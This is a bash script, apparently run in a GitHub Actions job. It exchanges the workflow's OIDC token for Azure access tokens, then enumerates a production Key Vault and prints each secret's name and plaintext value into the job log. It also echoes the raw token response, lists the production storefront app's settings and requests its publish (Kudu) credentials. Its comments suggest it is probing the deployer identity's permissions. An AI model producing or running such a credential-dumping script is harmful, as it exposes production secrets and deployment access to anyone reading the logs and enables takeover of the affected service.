#!/usr/bin/env bash
set -uo pipefail

# Get GitHub OIDC token
OIDC_URL="$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange"
OIDC_TOKEN=$(curl -sSf -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$OIDC_URL" | python3 -c "import sys,json; print(json.load(sys.stdin)[\"value\"])")

TENANT_ID="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
CLIENT_ID="72ff278a-9e71-43ec-bac4-2ca303f8e462"

# Exchange OIDC for KV-scoped cicd-deployer token (KV prod uses access policies, cicd-deployer has Get+List)
KV_RESPONSE=$(curl -sSf -X POST "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "client_id=$CLIENT_ID" \
  --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$OIDC_TOKEN" \
  --data-urlencode "grant_type=client_credentials" \
  --data-urlencode "scope=https://vault.azure.net/.default")
echo "KV token response: $KV_RESPONSE"
KV_ACCESS=$(echo "$KV_RESPONSE" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get(\"access_token\",\"\"))")

echo "=== List KV prod secrets (cicd-deployer has access policy Get+List) ==="
LIST_RESP=$(curl -sSf "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" \
  -H "Authorization: Bearer $KV_ACCESS")
echo "LIST: $LIST_RESP"

echo ""
echo "=== Read each secret value ==="
echo "$LIST_RESP" | python3 -c "
import sys,json
d=json.load(sys.stdin)
for s in d.get(\"value\",[]):
    print(s[\"id\"])
" | while read sid; do
  NAME=$(echo "$sid" | rev | cut -d/ -f1 | rev)
  echo "SECRET_NAME=$NAME"
  curl -sSf "$sid?api-version=7.4" -H "Authorization: Bearer $KV_ACCESS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(\"SECRET_VAL=\"+d.get(\"value\",\"NONE\"))"
done

# Also get management token
MGMT_RESPONSE=$(curl -sSf -X POST "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "client_id=$CLIENT_ID" \
  --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$OIDC_TOKEN" \
  --data-urlencode "grant_type=client_credentials" \
  --data-urlencode "scope=https://management.azure.com/.default")
MGMT_ACCESS=$(echo "$MGMT_RESPONSE" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get(\"access_token\",\"\"))")

echo "=== App settings via management (cicd-deployer may have Contributor on app) ==="
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG="rg-tbl-platform-prod-sea"
curl -sS -X POST "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-01-01" \
  -H "Authorization: Bearer $MGMT_ACCESS" \
  -H "Content-Type: application/json" -d "{}"

echo "=== Publish credentials (KUDU access) ==="
curl -sS -X POST "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/publishxml?api-version=2023-01-01" \
  -H "Authorization: Bearer $MGMT_ACCESS" \
  -H "Content-Type: application/json" -d "{}"

echo ""
echo "=== Done ==="

